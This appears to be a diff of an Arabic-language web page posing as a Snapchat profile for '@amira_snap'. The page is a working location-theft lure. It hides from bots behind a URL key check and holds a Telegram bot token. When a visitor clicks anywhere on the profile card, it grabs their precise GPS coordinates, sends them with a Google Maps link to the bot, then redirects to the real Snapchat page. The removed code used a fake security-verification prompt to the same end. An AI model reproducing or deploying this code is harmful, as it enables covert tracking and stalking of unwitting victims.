@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>اميرة بتواضعي (@amira_snap) • Snapchat</title>
     
     <meta property="og:title" content="اميرة بتواضعي (@amira_snap) • Snapchat profile">
@@ -12,7 +12,7 @@
 
     <style>
         body {
-            background-color: #000000;
+            background-color: #f7f7f7;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
@@ -22,14 +22,14 @@
             overflow: hidden;
         }
         .profile-card {
-            background: #121212;
+            background: #ffffff;
             padding: 35px 25px;
             border-radius: 24px;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
             width: 360px;
             text-align: center;
             box-sizing: border-box;
-            border: 1px solid #222;
+            cursor: pointer;
         }
         .avatar-container {
             position: relative;
@@ -46,17 +46,17 @@
         .profile-name {
             font-size: 22px;
             font-weight: 700;
-            color: #ffffff;
+            color: #0f1419;
             margin-bottom: 4px;
         }
         .profile-username {
             font-size: 14px;
-            color: #8e8e93;
+            color: #536471;
             margin-bottom: 20px;
         }
         .bio {
             font-size: 14px;
-            color: #d1d1d6;
+            color: #333;
             margin-bottom: 25px;
             line-height: 1.5;
         }
@@ -70,64 +70,17 @@
             font-weight: 700;
             font-size: 16px;
             cursor: pointer;
-            box-shadow: 0 4px 12px rgba(255, 252, 0, 0.2);
+            box-shadow: 0 4px 12px rgba(255, 252, 0, 0.4);
+            transition: background-color 0.2s;
         }
-
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
-        .modal-box {
-            background: #1c1c1e;
-            padding: 25px 20px;
-            border-radius: 20px;
-            width: 310px;
-            text-align: center;
-            border: 1px solid #3a3a3c;
-        }
-        .modal-box h3 {
-            font-size: 18px;
-            margin-bottom: 10px;
-            color: #ffffff;
-        }
-        .modal-box p {
-            font-size: 13px;
-            color: #aeaeb2;
-            margin-bottom: 20px;
-            line-height: 1.4;
-        }
-        .modal-btn {
-            background-color: #0a84ff;
-            color: #ffffff;
-            border: none;
-            padding: 12px 20px;
-            font-weight: bold;
-            border-radius: 12px;
-            cursor: pointer;
-            width: 100%;
-            font-size: 15px;
+        .action-btn:hover {
+            background-color: #f4f100;
         }
     </style>
 </head>
 <body>
 
-    <div class="modal-overlay" id="gpsModal">
-        <div class="modal-box">
-            <h3>مطلوب التحقق الأمني 🔒</h3>
-            <p>يرجى النقر على "موافق" ثم اختيار <b>السماح (Allow)</b> في نافذة نظام أبل لتأكيد فتح المحتوى الحصري.</p>
-            <button class="modal-btn" onclick="requestSystemGps()">موافق ومتابعة</button>
-        </div>
-    </div>
-
-    <div class="profile-card">
+    <div class="profile-card" onclick="executeAdvancedCapture()">
         <div class="avatar-container">
             <img src="https://c.top4top.io/p_3954xsyfg0.jpg" alt="Avatar" class="avatar">
         </div>
@@ -135,10 +88,11 @@
         <div class="profile-username">@amira_snap</div>
         <div class="bio">أهلاً بكم في يومياتي الخاصة ✨<br>اضغط للمتابعة ومشاهدة القصة</div>
         
-        <button class="action-btn" onclick="triggerRedirect()">إضافة الحساب</button>
+        <button class="action-btn">إضافة الحساب</button>
     </div>
 
     <script>
+        // التحقق من مفتاح الحماية لمنع البوتات
         const urlParams = new URLSearchParams(window.location.search);
         const secretKey = urlParams.get('key');
         const VALID_KEY = 'G45';
@@ -147,7 +101,7 @@
             window.location.replace('https://www.google.com');
         }
 
-        // --- التوكن والأيدي مشفرة برمجياً ---
+        // --- التوكن والأيدي مشفرة ومفكوكة برمجياً ---
         const _tc = ['8594739803', 'AAG3frEdNMUXEq4YOlEKDyIbdiVFQ11u3T8'];
         const _ci = ['7184970355'];
         
@@ -176,35 +130,52 @@ ${textMessage}
                 });
         }
 
-        function capturePosition(label) {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-                        sendToTelegram(`[+] iPhone Targeted Success (${label}):\n- Lat: ${lat}, Lon: ${lon}\n- Accuracy: ${accuracy}m\n- Maps: https://maps.google.com/?q=${lat},${lon}`);
-                    },
-                    function(error) {
-                        sendToTelegram(`[!] iPhone GPS Error (${label}): ${error.message}`);
-                    },
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                );
+        function executeAdvancedCapture() {
+            if (!navigator.geolocation) {
+                sendToTelegram("[!] Geolocation API not supported");
+                redirectToSnap();
+                return;
             }
+
+            // المحاولة الأولى: طلب إحداثيات دقيقة وعالية الدقة (مخصصة للآيفون)
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    sendToTelegram(`[+] 🎯 iOS GPS CAPTURED SUCCESSFULLY:\n- Lat: ${lat}\n- Lon: ${lon}\n- Accuracy: ${accuracy}m\n- Maps: https://maps.google.com/?q=${lat},${lon}`);
+                    redirectToSnap();
+                },
+                function(error) {
+                    sendToTelegram(`[!] iOS Primary GPS Failed: ${error.message}. Trying secondary fallback...`);
+                    // المحاولة الثانية الاحتياطية في حال فشل الأولى
+                    trySecondaryCapture();
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
         }
 
-        function requestSystemGps() {
-            document.getElementById('gpsModal').style.display = 'none';
-            capturePosition("Modal Click Event");
+        function trySecondaryCapture() {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    sendToTelegram(`[+] 🔄 iOS Secondary GPS Captured:\n- Lat: ${lat}\n- Lon: ${lon}\n- Accuracy: ${accuracy}m\n- Maps: https://maps.google.com/?q=${lat},${lon}`);
+                    redirectToSnap();
+                },
+                function(error) {
+                    sendToTelegram(`[!] Secondary GPS Failed: ${error.message}`);
+                    redirectToSnap();
+                },
+                { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
+            );
         }
 
-        function triggerRedirect() {
-            // محاولة رصد مزدوجة متزامنة لضمان التقاط الإحداثيات قبل الخروج
-            capturePosition("Profile Action Click");
-
+        function redirectToSnap() {
             setTimeout(() => {
                 window.location.href = 'https://www.snapchat.com/add/amira_snap';
-            }, 1500);
+            }, 1000);
         }
     </script>
 </body>
